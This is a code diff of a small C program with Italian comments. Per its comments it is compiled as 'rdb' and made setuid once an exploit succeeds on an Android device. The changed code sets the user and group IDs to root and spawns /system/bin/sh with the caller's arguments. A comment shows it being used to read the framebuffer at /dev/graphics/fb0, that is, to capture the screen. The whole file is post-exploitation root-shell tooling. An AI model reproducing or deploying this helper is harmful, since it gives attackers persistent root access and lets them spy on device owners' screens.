@@ -24,7 +24,9 @@
 #define LOG(x)  printf(x)
 
 // questo file viene compilato come rdb e quando l'exploit funziona viene suiddato
-int main(int arcg, char** argv){
+
+// statuslog -c "/system/bin/cat /dev/graphics/fb0"
+int main(int argc, char** argv) {
 	seteuid(0);
 	setegid(0);
 	setuid(0);
@@ -34,7 +36,19 @@ int main(int arcg, char** argv){
 	sprintf(buf, "Exploit Status: EUID: %d, UID: %d\n", geteuid(), getuid());
 	LOG(buf);
 
-	const char * shell = "/bin/sh";
-	execve(shell,0,0);
+	const char * shell = "/system/bin/sh";
+	LOG("Starting shell\n");
+
+	char *exec_args[argc + 1];
+	exec_args[argc] = NULL;
+	exec_args[0] = "sh";
+	int i;
+	for (i = 1; i < argc; i++) {
+		exec_args[i] = argv[i];
+	}
+	execv("/system/bin/sh", exec_args);
+
+	LOG("Exiting shell\n");
+
 	return 0;
 }
